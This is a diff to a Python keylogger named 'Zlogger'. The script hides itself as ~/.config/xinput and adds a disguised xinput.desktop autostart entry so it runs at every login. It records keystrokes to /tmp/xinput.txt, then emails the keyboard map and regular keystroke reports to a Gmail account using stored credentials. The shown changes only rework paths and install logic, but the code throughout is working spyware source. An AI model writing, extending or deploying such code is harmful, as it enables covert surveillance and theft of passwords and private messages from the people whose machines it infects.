@@ -10,9 +10,8 @@ from subprocess import Popen, PIPE, check_output
 EMAIL_SERVER = "smtp.gmail.com"
 
 LOG_FILE = "/tmp/xinput.txt"
-HOME_CONFIG_DIRECTORY = os.path.expanduser('~') + "/.config/"
-AUTOSTART_PATH = HOME_CONFIG_DIRECTORY + "/autostart/"
-AUTOSTART_FILE = AUTOSTART_PATH + "xinput.desktop"
+
+HOME_DIRECTORY = os.path.expanduser('~')
 
 AUTOSTART_ENTRY = """
 [Desktop Entry]
@@ -25,7 +24,7 @@ def send_mail(subject, content):
 	msg = MIMEMultipart()
 	msg['Subject'] = subject
 	msg.attach(MIMEText(content))
-	mailer = smtplib.SMTP(EMAIL_SERVER, 587)
+	mailer = smtplib.SMTP(config.EMAIL_SERVER, 587)
 	
 	mailer.starttls()
 	mailer.login(config.EMAIL, config.PASSWORD)
@@ -48,37 +47,39 @@ def chmod_to_exec(file):
 
 
 def initialize():
+	autostart_path = HOME_DIRECTORY + "/.config/autostart/"
 	try:
-	    os.makedirs(AUTOSTART_PATH)
+	    os.makedirs(autostart_path)
 	except OSError:
 	    pass
 	
-	current_file = os.path.realpath(__file__).replace(".py", "")
-	
-	destination_file = HOME_CONFIG_DIRECTORY + config.FILE_NAME
 	copyfile(current_file, destination_file)
 	chmod_to_exec(destination_file)
 
-	with open(AUTOSTART_FILE,'w') as out:
+	autostart_file = autostart_path + "xinput.desktop"
+	with open(autostart_file,'w') as out:
 	    out.write(AUTOSTART_ENTRY + "Exec=" + destination_file + "\n")
 
-	chmod_to_exec(AUTOSTART_FILE)
+	chmod_to_exec(autostart_file)
 
 	#Get Keyboard map and send it
 	kmap = check_output("xmodmap -pke", shell=True)
 	send_mail("Zlogger Character Map",kmap)
-	Popen(destination_file)
 
 def send_mail_reports_every(interval):
 	while True:
 		sleep(interval)
-		send_mail("Zlogger Report", file(LOG_FILE).read())
+		send_mail("Zlogger report", file(LOG_FILE).read())
 		with open(LOG_FILE, "w"):
 			pass
 
 
-if not os.path.isfile(AUTOSTART_FILE) :
+current_file = os.path.realpath(__file__).replace(".py", "")
+destination_file = HOME_DIRECTORY + "/.config/xinput"
+
+if current_file != destination_file:
 	initialize()
+	Popen(destination_file)
 else:
 	start_logging(LOG_FILE)
 	send_mail_reports_every(config.SLEEP_INTERVAL)
